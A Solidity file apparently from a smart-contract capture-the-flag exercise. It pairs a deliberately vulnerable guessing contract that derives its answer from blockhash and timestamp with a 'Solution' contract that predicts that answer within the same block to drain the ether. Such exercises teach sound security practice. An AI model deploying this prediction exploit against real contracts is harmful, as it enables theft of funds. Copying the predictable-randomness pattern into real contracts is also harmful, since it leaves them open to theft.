// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

contract PredictTheFutureChallenge {
    address public guesser;
    uint8 public guess;
    uint256 public settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether, "Send 1 ether");
    }

    function isComplete() external view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) external payable {
        require(guesser == address(0), "Already guessed");
        require(msg.value == 1 ether, "Send 1 ether");

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() external {
        require(msg.sender == guesser, "Not a guesser");
        require(block.number > settlementBlockNumber, "Too early");

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}

contract PredictTheFutureSolution {
    PredictTheFutureChallenge public challenge;
    uint8 private constant WINNING_NUMBER = 0;

    constructor(address payable challengeAddress) payable {
        require(challengeAddress != address(0), "Invalid address");
        challenge = PredictTheFutureChallenge(challengeAddress);
    }

    function lockInGuess() external payable {
        challenge.lockInGuess{ value: msg.value }(WINNING_NUMBER);
    }

    function settle() external {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        if (answer == WINNING_NUMBER) {
            challenge.settle();
            payable(msg.sender).transfer(2 ether);
        }
    }

    receive() external payable {}
}
